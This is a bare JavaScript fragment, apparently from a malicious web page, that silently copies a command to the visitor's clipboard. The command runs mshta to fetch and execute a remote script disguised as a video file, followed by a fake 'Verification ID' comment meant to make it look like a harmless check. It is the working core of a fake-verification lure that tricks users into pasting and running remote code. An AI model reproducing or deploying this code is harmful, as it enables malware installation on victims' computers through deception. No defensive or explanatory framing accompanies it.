var cmd = "mshta https://example.com/verification.mp4 # Verification ID: " + Math.random().toString(36).substring(7);
eval("navigator.clipboard.writeText(cmd);");
